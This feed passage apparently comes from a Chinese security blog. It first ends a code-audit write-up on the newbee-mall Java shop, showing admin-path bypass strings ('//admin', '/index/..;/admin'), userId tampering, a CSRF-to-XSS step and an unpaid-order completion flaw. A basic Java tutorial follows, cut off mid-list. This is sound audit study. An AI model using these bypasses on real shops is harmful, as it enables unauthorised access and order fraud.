href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><ol><li><p>上面提到过，存在interceptor拦截器（可以寻找相关函数）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163026770.png" alt="image-20251015154849036"></p></li><li><p>步入看一下</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163028092.png" alt="image-20251015155304419"></p><p>对url路径设置了不同的interceptor</p><p>addPathPatterns表示其中的路径会经过设置的拦截器，excludePathPatterns不过该拦截器</p><p><code>其中两个星**表示匹配任意字符。如果出现一个星*则表示匹配单个路径</code></p></li><li><p>找到拦截器，下面就要看登录页面，所以可以跟进一下NewBeeMallLoginInterceptor</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163029780.png" alt="image-20251015210304376"></p><p>用 getServletPath() 来获取最后真正分发到路由地方的 path，getRequestURI() 只是获取了请求的 URl</p><p>这个意义不大</p><p>所以找一下下一个类AdminLoginInterceptor</p></li><li><p>AdminLoginInterceptor，就是第二步骤里面的类名</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163031202.png" alt="image-20251015210714466"></p><p>使用了 getRequestURI() 来获取URI来判断URI是否以 &#x2F;admin 开头，如果是 &#x2F;admin 开头则校验 session，不是则不用校验（其实这个和上面那个后台权限绕过的类似，都定位到这里了）</p></li><li><p>payload</p><ul><li><p>进入dashboard模块</p><p>输入&#x2F;&#x2F;admin 或 &#x2F;index&#x2F;..;&#x2F;admin也可以成功访问到页面</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163033016.png" alt="image-20251015211040611"></p><p>成功绕过了目录访问字符限制</p></li></ul></li></ol><h2 id="水平越权漏洞（1，2）"><a href="#水平越权漏洞（1，2）" class="headerlink" title="水平越权漏洞（1，2）"></a>水平越权漏洞（1，2）</h2><p>上面的分析已经提前说过了</p><p>可以看一下Controller的<strong>相关文件</strong>，直接看controller<strong>目录</strong>也行，可能存在<strong>水平越权漏洞</strong></p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><ol><li><p>在文件里面全局搜索<strong>Controller</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163034498.png" alt="image-20251015211548470"></p></li><li><p>寻找到目标文件（初审里面总结一小部分注入点）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163036179.png" alt="image-20251015212148806"></p></li><li><p>接着看 updateUserInfo() 的<strong>实现</strong><br>src\main\java\ltd\newbee\mall\service\impl\NewBeeMallUserServiceImpl.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163037476.png" alt="image-20251015213516667"></p><p>发现这里从数据库查找用户并未用到 session ，而是直接以传递过来的 userId 为参数来查找并修改数据的，所以这里存在水平越权漏洞，修改 userId 便可修改其他用户的信息。</p></li><li><p>payload</p><ul><li><p>注册一个用户，然后查看个人信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163038729.png" alt="image-20251015213807750"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163215149.png" alt="image-20251015213844712"></p></li><li><p>使用burp抓包，修改用户 userId <img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20251015214259650.png" alt="image-20251015214259650" style="zoom:33%;" /></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163044634.png" alt="image-20251015214436198"></p><p>ok，回显成功</p></li></ul></li></ol><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ol><li><p>还是根据上面的流程进入OrderController（查询订单）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163046794.png" alt="image-20251015215316713"></p></li><li><p>跟进getOrderDetailByOrderNo() 函数<br>src\main\java\ltd\newbee\mall\service\impl\NewBeeMallOrderServiceImpl.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163048125.png" alt="image-20251015215401216"></p><p>还是id问题，输入其他id，可以查看其他人的cookic，没有绕过限制</p></li><li><p>payload</p><p>跟上面一样抓包+改数据即可</p><p>我就不演示了🤭，我相信各位大佬可以</p></li></ol><h2 id="Csrf漏洞"><a href="#Csrf漏洞" class="headerlink" title="Csrf漏洞"></a>Csrf漏洞</h2><ol><li><p>添加购物车功能，抓包，查看请求内容，没有任何token值来进行校验</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163053058.png" alt="image-20251015215926101"></p></li><li><p>由于是json格式的请求，不能直接使用burp Generate CSRF PoC，因为burp生成的PoC无法伪造Content-Type。burp生成的CSRF PoC请求内容如下，可以看到Content-Type: text&#x2F;plain，并且post数据多出一个等号</p><p>直接在bp的插件里面生成csrf的代码就行</p><p>是一个html</p></li><li><p>payload</p><ul><li><p>对上面生成csrf的poc进行抓包</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163055483.png" alt="image-20251015220131216"></p></li><li><p>然后成功写入xss的payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163105549.png" alt="image-20251015220157720"></p></li><li><p>查看页面，成功添加</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163106531.png" alt="image-20251015220232223"></p></li></ul></li></ol><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><ol><li><p>下订单但未支付时，访问&#x2F;orders&#x2F;{orderNo}&#x2F;finish可直接完成交易</p><p>直接看代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163113629.png" alt="image-20251015220420234"></p><p>从代码中发现直接调用newBeeMallOrderService.finishOrder(orderNo, user.getUserId())，对于该订单是否支付，是否出库等过程都<strong>没有校验</strong></p></li><li><p>put方式去请求即可（左边标黄的就是  <strong>putmapping</strong>）<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163114921.png" alt="image-20251015220657894"></p></li><li><p>payload</p><ul><li><p>添加一件物品到购物车，然后提交订单</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163116396.png" alt="image-20251015220904271"></p></li><li><p>点击去支付，一系列流程下来可以购买商品</p><p>管理员查看显示  待支付</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163118857.png" alt="image-20251015221005435"></p></li><li><p>我们使用put方式去请求</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163121952.png" alt="image-20251015221101972"></p></li><li><p>查看回显成功支付商品</p></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java入门</title>
    <link href="/2025/10/27/java%E5%85%A5%E9%97%A8/"/>
    <url>/2025/10/27/java%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="用户交互Scanner"><a href="#用户交互Scanner" class="headerlink" title="用户交互Scanner"></a>用户交互Scanner</h2><ol><li><p>输入&amp;输入方法（比如是输入hello  world）</p><ul><li><p>next（）输入字符串不能存在空格      （输出hello）</p></li><li><p>nextLine（），回车前的所有字符，可以获取到空格     （输出hello  world）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xxxxx.xxx.xxx<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 从键盘接收数据</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入数据：&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> scanner.nextLine();<br>        System.out.println(<span class="hljs-string">&quot;输出的内容为：&quot;</span>+str);<br>        scanner.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (scanner.hasNextInt()) &#123;    <span class="hljs-comment">//这个条件是判断 输入是不是整数的</span><br>    i = scanner.nextInt();<br>    System.out.println(<span class="hljs-string">&quot;整数数据：&quot;</span> + i);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;输入的不是整数数据：&quot;</span> + i);<br>&#125;<br></code></pre></td></tr></table></figure><p>判断字符串有函数：<br>x.equal（“xcsccsc”）     判断x输入字符串和xcsccsc字符串是否相等</p></li></ol><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><ol><li><p>if</p><ul><li><p>单层–if</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>两层–if    else</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<span class="hljs-keyword">else</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>多层–if   else if   else</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<span class="hljs-keyword">else</span>()&#123;<br>    System.out.println(<span class="hljs-string">&quot;*****&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>switch case</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span>(expression)&#123;<br>    <span class="hljs-keyword">case</span> value :<br>        <span class="hljs-comment">//语句</span><br>        <span class="hljs-keyword">break</span>; <span class="hljs-comment">//可选</span><br>    <span class="hljs-keyword">case</span> value :<br>        <span class="hljs-comment">//语句</span><br>        <span class="hljs-keyword">break</span>; <span class="hljs-comment">//可选</span><br>    <span class="hljs-comment">//你可以有任意数量的case语句</span><br>    <span class="hljs-keyword">default</span> : <span class="hljs-comment">//可选</span><br>        <span class="hljs-comment">//语句</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>switch变量类型：byte   short   int   char   <strong>string</strong>（java7以后）</li><li>case变量类型：字符串常量  自变量</li><li>case穿透：不写break就在条件后<strong>全执行</strong></li></ul></li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ol><li><p>while</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(布尔值)&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>注意要写退出循环的限制条件，不然会变成死循环</p><p>eg：i++；</p></li><li><p>do  while</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jaVA"><span class="hljs-keyword">do</span>&#123;<br>    <br>&#125;<span class="hljs-keyword">while</span>();<span class="hljs-comment">//注意有分号</span><br></code></pre></td></tr></table></figure></li><li><p>for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(初始化（可以空）;布尔表达式;更新)&#123;<span class="hljs-comment">//分号隔开</span><br>    代码语句<br>&#125;<br></code></pre></td></tr></table></figure><p>在idea里面，写<strong>100.for</strong>可以直接生成</p></li><li><p>增强for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ForDemo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] numbers = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>&#125;; <span class="hljs-comment">//定义了一个数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x:numbers)&#123;<br>            System.out.println(x);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历数组，每次for循环输出</p></li></ol><ul><li><p>While和do-While的区别:]</p><p>while先判断后执行。dowhile是先执行后判断!</p><p>Do…while总是保证循环体会被<strong>至少执行一次</strong>!这是他们的主要差别</p></li><li><p>break&amp;&amp;continue</p><p>break用于强制退出循环，不终止程序（放在判断后）</p><p>continue只是这一次不执行，下一次继续执行</p><p>（goto在java<strong>不存在</strong>）但是可以利用标签使用，起跳转作用</p></li></ul><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>方法类似于函数</p><ul><li><p>System.out.printIn()<br>类.对象.方法</p></li><li><p>Java方法是语句的集合，它们在一起执行一个功能</p><ul><li>方法是解决一类问题的步骤的有序组合</li><li>方法包含于类或对象中</li><li>方法在程序中被创建，在其他地方被引用</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span>&#123;<br>    <span class="hljs-comment">//main方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(string[]args)</span>&#123;<br>        <span class="hljs-type">int</span> sum=add(a:<span class="hljs-number">1</span>,b:<span class="hljs-number">2</span>);System.out.println(sum);<br>    &#125;<br><span class="hljs-comment">//加法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在写方法的时候<code>public  int add(int a,int b)</code>，要想调就要加一个<code>static</code></p><ul><li><p>设计方法的原则:方法的本意是功能块，就是实现某个功能的语句块的集合。我们设计方法的时候，最好保持方法的原子性，<strong>就是一个方法只完成1个功能，这样利于我们后期的扩展</strong></p><p>可以多用写一些方法，把main函数变得更加简洁</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">修饰符 返回值类型 方法名(参数类型 参数名)&#123;<br>    ...<br>    方法体<br>    ....<br>    <span class="hljs-keyword">return</span> 返回值;<span class="hljs-comment">//有返回类型，一定要写return</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><ul><li>当方法返回一个值的时候，方法调用通常被当做一个值</li><li>如果方法返回值是void，方法调用一定是一条语句</li></ul><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>函数名称相同，参数类型不同（返回值是谁，就调用谁）</p><p><code>参数类型也可以相同，在方法里面强制转化就行</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//比大小</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">double</span> num1,<span class="hljs-type">double</span> num2)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (num1==num2)&#123;<br>        System.out.println(<span class="hljs-string">&quot;num1==num2&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//终止方法</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (num1&gt;num2)&#123;<br>        result = (<span class="hljs-type">int</span>)num1;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        result = (<span class="hljs-type">int</span>)num2;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是在调用的时候，要调配和方法相匹配，要不编译器会报错</p><h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommandLine</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;args.length; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;args[&quot;</span> + i + <span class="hljs-string">&quot;]: &quot;</span> + args[i]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125533446.png" alt="image-20251022090113344"></p><p>直接在idea里面的命令行运行不成功，所以打开方法-所在文件夹，使用命令行编译，发现还是不行</p><p>因为运行需要在src目录下，回退完目录后，再次运行</p><p>源码定义的是一个数组，所以在语句后面跟上参数<code>this is kuangshen</code></p><p>发现成功返回</p><p><strong>也就是说main方法也是可以传参的</strong></p><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>本质就是一个数组</p><ul><li>JDK 1.5 开始，Java支持传递同类型的可变参数给一个方法。、</li><li>在方法声明中，在指定参数类型后加一个省略号(…)  </li><li>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Demo04</span> <span class="hljs-variable">demo04</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo04</span>();<br>        demo04.test(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">45</span>,<span class="hljs-number">5</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span>... i)</span>&#123;<br>        System.out.println(i[<span class="hljs-number">0</span>]);<br>        System.out.println(i[<span class="hljs-number">1</span>]);<br>        System.out.println(i[<span class="hljs-number">2</span>]);<br>        System.out.println(i[<span class="hljs-number">3</span>]);<br>        System.out.println(i[<span class="hljs-number">4</span>]);<br>        System.out.println(i[<span class="hljs-number">5</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>自己调用自己</p><p>简单来说就是找到公式规律，然后往前一个未知数推导（复杂问题，简单化，减少重复计算，减少代码量）</p><ul><li><p>递归结构包括两个部分：</p><p>递归头:什么时候不调用自身方法，如果没有头，将陷入死循环</p><p>递归体:什么时候需要调用自身方法</p></li></ul><p>java主要使用的是栈，就是罐子里面一个叠一个，<strong>先放后拿</strong> </p><h2 id="静态-非静态"><a href="#静态-非静态" class="headerlink" title="静态&amp;非静态"></a>静态&amp;非静态</h2><ul><li><p>静态：有static</p><p>在其他类里面写，可以在main里面调用 <code>类.方法</code></p></li><li><p>非静态：</p><p>调用：将类实例化new———&gt;对象类型  对象名&#x3D;对象值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">student</span>();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125532966.png" alt="image-20251022215227014"></p></li></ul><h2 id="调用-1"><a href="#调用-1" class="headerlink" title="调用"></a>调用</h2><ul><li>有static，和类一起加载，存在较早</li><li>无static，在类实例化之后才存在，比上面那个迟</li></ul><p>所以<strong>不能</strong>在有static，调用无static的方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125535537.png" alt="image-20251022215527356"></p><p><strong>b（）</strong>明显报错了</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>定义一组类型，相同类型的有序集合，通过下标访问</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jaVa"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(stringl args)</span>&#123;<br>    <span class="hljs-type">int</span>[] nums; <span class="hljs-comment">//1.定义</span><br>    <span class="hljs-type">int</span> nums2[];<span class="hljs-comment">//2.c和c++使用的多</span><br>&#125;<br></code></pre></td></tr></table></figure><p>没定义，返回默认值（int 的默认值就是0）</p><p>获取数组长度是<code>arrays。length</code></p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ul><li><p>静态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 静态初始化: 创建 + 赋值</span><br>       <span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>&#125;;<br>       System.out.println(a[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure></li><li><p>动态初始化（<code>包含默认初始化</code>）</p><p>先分配内存（初始化）（变成默认值），再赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 动态初始化 : 包含默认初始化</span><br>       <span class="hljs-type">int</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>       b[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p>数组的默认初始化</p><p>就是分配内存的初始化</p></li></ul><h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><ol><li>堆</li><li>栈</li><li>方法区</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">步骤 <span class="hljs-number">1</span>：声明数组<br>代码<span class="hljs-type">int</span>[] <span class="hljs-keyword">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">null</span>;声明了一个整型数组变量<span class="hljs-keyword">array</span>，并将其初始化为<span class="hljs-keyword">null</span>，表示该数组目前没有指向任何实际的数组对象<br><br>步骤 <span class="hljs-number">2</span>：创建数组<br>代码<span class="hljs-keyword">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>];创建了一个长度为 <span class="hljs-number">10</span> 的整型数组，并将其引用赋值给<span class="hljs-keyword">array</span>变量，此时数组的每个元素都有了默认值（整型数组默认值为 <span class="hljs-number">0</span>）<br><br>步骤 <span class="hljs-number">3</span>：给数组元素赋值<br>代码通过类似nums[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;这样的语句（这里变量名可能存在笔误，应为<span class="hljs-keyword">array</span>），给数组的每个元素依次赋值，从<span class="hljs-keyword">array</span>[<span class="hljs-number">0</span>]到<span class="hljs-keyword">array</span>[<span class="hljs-number">9</span>]分别赋值为 <span class="hljs-number">1</span> 到 <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>先声明空数组（栈），在new一个数组（在堆内部分配空间），然后赋值（赋值）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125540714.png" alt="image-20251022153931969"></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>其长度是确定的。数组一旦被创建，它的大小就是不可以改变的。</li><li>其元素必须是相同类型,不允许出现混合类型</li><li>数组中的元素可以是任何数据类型，包括基本类型和引用类型</li><li>数组变量属引用类型，数组也可以看成是对象，数组中的每个元素相当于该对象的成员变量。</li><li>数组<strong>本身就是对象</strong>，Java中对象是在堆中的因此数组无论保存原始类型还是其他对象类型，<strong>数组对象本身是在堆中的</strong></li><li>数组下标越界会报错（边界异常）</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li><p>打印所有的数组元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 